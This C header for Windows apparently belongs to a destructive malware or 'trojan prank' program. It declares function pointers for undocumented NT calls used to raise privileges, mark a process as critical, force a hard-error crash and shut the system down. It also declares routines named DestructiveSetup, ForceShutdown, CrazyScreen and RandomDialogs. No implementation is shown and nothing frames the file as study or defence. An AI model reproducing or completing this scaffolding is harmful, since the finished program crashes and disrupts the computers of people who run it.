#pragma once
#include <Windows.h>
#include <SubAuth.h>
#include "TaskScheduler.h"


typedef enum _HARDERROR_RESPONSE_OPTION {
    OptionAbortRetryIgnore,
    OptionOk,
    OptionOkCancel,
    OptionRetryCancel,
    OptionYesNo,
    OptionYesNoCancel,
    OptionShutdownSystem
} HARDERROR_RESPONSE_OPTION, * PHARDERROR_RESPONSE_OPTION;

typedef enum _HARDERROR_RESPONSE {
    ResponseReturnToCaller,
    ResponseNotHandled,
    ResponseAbort,
    ResponseCancel,
    ResponseIgnore,
    ResponseNo,
    ResponseOk,
    ResponseRetry,
    ResponseYes
} HARDERROR_RESPONSE, * PHARDERROR_RESPONSE;

typedef enum _SHUTDOWN_ACTION {
    ShutdownNoReboot,
    ShutdownReboot,
    ShutdownPowerOff
} SHUTDOWN_ACTION, * PSHUTDOWN_ACTION;

//#ifdef NDEBUG

typedef NTSTATUS(NTAPI* PRTLADJUSTPRIVILEGE)(
    IN ULONG Privilege,
    IN BOOLEAN Enable,
    IN BOOLEAN Client,
    OUT PBOOLEAN PreviousValue OPTIONAL
    );

typedef NTSTATUS(NTAPI* PRTLINITUNICODESTRING)(
    OUT PUNICODE_STRING DestinationString,
    IN PCWSTR SourceString
    );

typedef NTSTATUS(NTAPI* PNTRAISEHARDERROR)(
    IN NTSTATUS ErrorStatus,
    IN ULONG NumberOfParameters,
    IN DWORD UnicodeStringParameterMask OPTIONAL,
    IN PVOID Parameters,
    IN HARDERROR_RESPONSE_OPTION ResponseOptions,
    OUT PHARDERROR_RESPONSE Response
    );

typedef NTSTATUS(NTAPI* PNTSHUTDOWNSYSTEM)(
    IN SHUTDOWN_ACTION ShutdownAction
    );

typedef NTSTATUS(NTAPI* PNTSETINFORMATIONPROCESS)(
    HANDLE            ProcessHandle,
    DWORD             ProcessInformationClass,
    PVOID             ProcessInformation,
    ULONG             ProcessInformationLength
    );

typedef NTSTATUS(NTAPI* PRTLSETPROCESSISCRITICAL)(
    BOOLEAN bNew,
    BOOLEAN* pbOld,
    BOOLEAN bNeedScb
    );


int WINAPI PowerOff();
int WINAPI DestructiveSetup(HINSTANCE hInstance);
int WINAPI ForceShutdown();
int WINAPI FuckUp();

int WINAPI RandomSounds();
int WINAPI BTIcons();
//int WINAPI WindowShaker();
int WINAPI CrazyScreen();
int WINAPI RandomDialogs();